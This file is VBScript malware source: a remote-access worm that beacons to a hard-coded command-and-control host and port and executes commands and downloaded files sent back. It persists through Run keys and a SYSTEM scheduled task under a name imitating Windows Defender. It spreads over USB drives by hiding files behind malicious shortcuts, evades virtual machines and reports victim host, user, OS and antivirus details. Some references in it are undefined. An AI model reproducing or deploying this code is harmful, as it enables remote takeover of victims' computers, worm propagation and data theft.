On Error Resume Next
WScript.Timeout=0
dim Wsh
set Wsh =WScript.CreateObject("WScript.Shell")
dim fs 
set fs= CreateObject("Scripting.FileSystemObject")
dim w
Set w = CreateObject("Microsoft.XMLHTTP")
dim dotnet
dotnet="No"
if fs.fileexists(Wsh.ExpandEnvironmentStrings("%windir%") & "\Microsoft.NET\Framework\v2.0.50727\vbc.exe") then
dotnet="Yes"
end if

dim host
host= "gamertn.ddns.net"
Dim port
port=1177
Dim DR
DR = Wsh.ExpandEnvironmentStrings("%TEMP%") & "\"
dim FN
FN ="windefenderr.vbs"
dim fh
dim fi
dim us
lnfe = True
lnfo = True
us="~"
ins
dim spl
spl="Sailor"
dim i
i=0
while true
On Error Resume Next
dim a 
WRT "readystate=" & w.readyState
if w.readystate=4 Then
WRT "reading >> responseText"
a= split(w.responseText,spl)
if ubound(a)<>-1 Then
select case a(0)
case "exc"
      dim sa
 sa= Replace( Replace( a(1),"post ","post "),"uns ","uns ")
 execute sa
case "uns"
 uns ""
 RcFile(a(1))

case "De"
 RcFile(a(1))
  if fs.fileexists( DR & "\De.exe") then
  Wsh.run DR & "\De.exe"
  end if
end select
Else
 end If
 WRT "do until w.readystate=4"
 do until w.readystate=4
 wscript.sleep(1000) '''''''''''''''''''''''''''''''
 if x.status =0 or x.status= 200 then
 else
 exit do
 end if
 loop
 post "?mew", ActiveWindow
 end if
 wscript.sleep 1000
 i = i + 1
 if i= 2 or i =4 or i =6 then
 xins
 end if
 if i>=7 then
 i=0
 if w.readystate<>4 Then
 WRT "readystate<>4 Aborting.."
 On Error Resume Next
 w.abort
 post "?mew","" 
 end if
 end if
wend

function vmcheck()
 On Error Resume Next
 Set WMI = GetObject("WinMgmts:")
 Set Col = WMI.ExecQuery("Select * from Win32_ComputerSystemProduct")
 For Each Ob in Col 
 if instr( lcase( ob.name),"virtual") >0 then
 On Error Resume Next
 fs.deletefile(wscript.scriptfullname)  
 do
 wscript.sleep(1000)
 loop
 end if
 next
end Function
function ins
 on error resume Next
 us= Wsh.regread("HKEY_CURRENT_USER\" & fn)
 if us="~" then
 if lcase( mid(wscript.scriptfullname,2))=":\" &  lcase(fn) then
 us="TRUE"
 Wsh.regwrite "HKEY_CURRENT_USER\" & fn,  us, "REG_SZ"
 else
 us="FALSE"
 Wsh.regwrite "HKEY_CURRENT_USER\" & fn,  us, "REG_SZ"
 end if
 end if
 Err.Clear
 dim drr
 
 WScript.Sleep 5000
 set fh = fs.OpenTextFile( dr & fn, 8, false)
 fs.CopyFile wscript.scriptfullname,dr & fn ,true
 fs.CopyFile wscript.scriptfullname, CreateObject("Wshell.Application").NameSpace(&H7).Self.Path & "\" & fn, True
 set fi = fs.OpenTextFile( dr & fn, 8, false)
 
 
 xins

 end Function
sub xins '''''''''''''''''''''''''''''''''regwrite
	On error resume Next

	If Wsh.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & fn)<> "%windir%\system32\wscript.exe /b " & chrw(34) & dr & fn & chrw(34) then
		Wsh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & fn, "%windir%\system32\wscript.exe /b " & chrw(34) & dr & fn & chrw(34), "REG_SZ"
	End if
	If Wsh.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & fn)<>"%windir%\system32\wscript.exe /b " & chrw(34) & dr & fn & chrw(34) then
		Wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & fn,"%windir%\system32\wscript.exe /b " & chrw(34) & dr & fn & chrw(34), "REG_SZ"
	End if
	If Wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden")="1" Then
		Wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden",0,"REG_DWORD" 
		End If
for each xx in fs.Drives
 
 
 if xx.isready then
	if xx.FreeSpace >0 then
		if xx.drivetype=1 then
			
			if fs.fileexists(xx.path & "\" & fn & ".vbs") then
				fs.getfile(xx.path & "\"  & fn & ".vbs").Attributes=0
			end if
			fs.copyfile dr & fn & ".vbs" , xx.path & "\"  & fn & ".vbs",true
			
			
			dim mx 
			mx=0
			for Each x In fs.GetFolder( xx.path & "\" ).Files
				
				if mx=20 then
					exit for
				end if 
				wscript.sleep 1
				if not lnfe then exit for
				if instr(x.name,".") Then
					if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" Then
			 			x.Attributes = 2
						if ucase(x.name) <> ucase(fn & ".vbs") Then
							mx =mx +1 
							With Wsh.CreateShortcut(xx.path & "\"  & x.name & ".lnk") 
							.TargetPath = "%SystemRoot%\system32\cmd.exe"
							.WorkingDirectory = ""
							.WindowStyle=7
							.Arguments = "/c start " & Replace(fn," ", ChrW(34) _
							& " " & ChrW(34)) & "&start " & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & " & exit"
							.IconLocation = Wsh.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\" & sh.regread("HKEY_LOCAL_MACHINE\SOFTWARE\Classes\." & Split(x.name, ".")(UBound(Split(x.name, "."))) & "\") & "\DefaultIcon\")
							if instr( .iconlocation,",")=0 then
								.iconlocation = .iconlocation &",0"
							end if
							.Save()
							end with
						end if
					end if
				end if
			Next
			mx=0
		    fs.CreateFolder(xx.path & "\! Videos\" )
			for Each x In fs.GetFolder( xx.path & "\" ).SubFolders
			if not lnfo then exit for
				if mx=20 then
					exit for
				end if 
					wscript.sleep 1
					x.Attributes = 2
					mx =mx +1 
					With Wsh.CreateShortcut(xx.path & "\"  & x.name & ".lnk")
					.TargetPath = "%SystemRoot%\system32\cmd.exe"
					.WorkingDirectory = ""
					.WindowStyle=7
					.Arguments = "/c start " & Replace(fn," ", ChrW(34)& " " & ChrW(34))  & "&start explorer /root,%CD%" & replace( x.name," ", ChrW(34) & " " & ChrW(34)) & "& exit"
					.IconLocation = "%windir%\system32\SHELL32.dll,3"
					.Save()
					end with
			Next
		end if
	end if
end if
next
Err.Clear
end sub
Sub WRT(s)
 On Error Resume Next
 WScript.Stdout.WriteLine s
 End Sub

function uns(ex)
 on error resume Next

 WRT "uns"
 fi.close
 fh.close
 Wsh.RegDelete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" & FN 
 Wsh.RegDelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & FN
 fs.DeleteFile dr & fn ,true
 fs.DeleteFile CreateObject("Shell.Application").NameSpace(&H7).Self.Path &"\" & FN ,True 
 Wsh.Run "cmd.exe /k SCHTASKS /delete  /TN feed /f &&exit", 0, false
 fs.DeleteFile dr & fn ,true
 fs.DeleteFile DR &"sc.exe"
 fs.DeleteFile DR &"s.jpg"
 fs.DeleteFile DR &"pc.exe"
 fs.DeleteFile DR &"tt.dat"
 fs.DeleteFile "C:\Windows\Temp\sys.vbs"
 for each xx in fs.Drives
 if xx.isready then
 if xx.FreeSpace >0 then
 For Each x In fs.GetFolder( xx.path & "\").Files
 if instr(x.name,".") then
 if lcase( Split(x.name, ".")(UBound(Split(x.name, "."))))<>"lnk" then
 x.Attributes = 0
 if ucase(x.name) <> ucase(fn) then
 fs.deletefile(xx.path & "\" & x.name & ".lnk" )
 else
 fs.deletefile( xx.path & "\" & x.name )
 end if
 end if
 end If

 Next
 For Each x In fs.GetFolder( xx.path & "\").SubFolders
 On Error Resume Next

 if fs.fileexists( xx.Path & "\"  & x.Name &".lnk") then
 fs.deletefile(xx.path & "\" & x.name & ".lnk" )
 end if
 x.Attributes = 0
 Next
 end if
 end if
 Next
 post "?uns",""
 Dim tout
 tout=0
 Do until w.readystate=4
 WRT "loop until readystate=4 Now=" & w.readystate
 wscript.sleep(1000)
 tout =tout + 1
 If tout=10 Then Exit do
 Loop
 WRT "BYE //ex=" & ex
 if ex<>"" then
 Wsh.Run "cmd.exe /c ping 0&start " & ex,0, false
 end if
 wscript.quit
end function
Function state
 return w.readyState
End Function
function post(cmd ,da)
 On Error Resume Next
 'WRT "POST: "  & cmd & " da=" & da
 w.open "POST","http://" & host & ":" & port &"/" & cmd, true

 w.setRequestHeader "User-Agent:",  inf
 w.setRequestHeader "Connection:","Keep-Alive"
 w.send da
end function
dim xinf
function imi
 
 fs.CopyFile wscript.scriptfullname,"C:\Windows\Temp\sys.vbs",true
 Wsh.Run "cmd.exe /k SCHTASKS /Create /sc minute /mo 50 /TN feed /TR C:\WINDOWS\Temp\sys.vbs /RU SYSTEM &&exit", 0, false 'xp
 Wsh.Run "cmd.exe /k SCHTASKS /Create /sc minute /mo 50 /TN feed /TR C:\WINDOWS\Temp\sys.vbs  &&exit", 0, false ' 7 8 8.1 10
end function
function inf
 on error resume Next
 if xinf="" then
 dim s
 s="??"
 s = hwd
 inf = inf & s & "\"
 s="??"
 s= Wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 inf = inf & s & "\"
 s="??"
 s= Wsh.ExpandEnvironmentStrings("%USERNAME%")
 inf = inf & s & "\"
 s="??"
 Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set aa = a.ExecQuery ("Select * from Win32_OperatingSystem")
 dim co
 For Each aaa in aa
 s= aaa.Caption  & " SP" & aaa.ServicePackMajorVersion
 co= aaa.countrycode
 exit for
 Next
 s= replace(s,"Microsoft","")
 s= replace(s,"Windows ","Win")
 s= Replace(s," Win","Win")
 inf = inf & s & "\\"  & security &"\lite 4.0\" & us &"\" & dotnet &"\" & pid & spl 
 xinf=inf
 else
 inf=xinf
 end if
end function
function HWD
 HWD="new_??"
 On Error Resume Next
 Set a = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set aa = a.ExecQuery("SELECT * FROM Win32_LogicalDisk")
 For Each aaa In aa
 if aaa.VolumeSerialNumber<>"" then
 HWD= "new_" & aaa.VolumeSerialNumber
 exit for
 end if
 Next
end Function
Function ActiveWindow
 ActiveWindow=""

End Function
function security 
 on error resume next

 security = ""

 set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
 set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
 for each objitem in colitems
    versionstr = split (objitem.version,".")
 next
 versionstr = split (colitems.version,".")
 osversion = versionstr (0) & "."
 for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
 next
 osversion = eval (osversion)
 if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"

 set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
 Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)

 for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
 next
 if security  = "" then security  = "nan-av"
end function


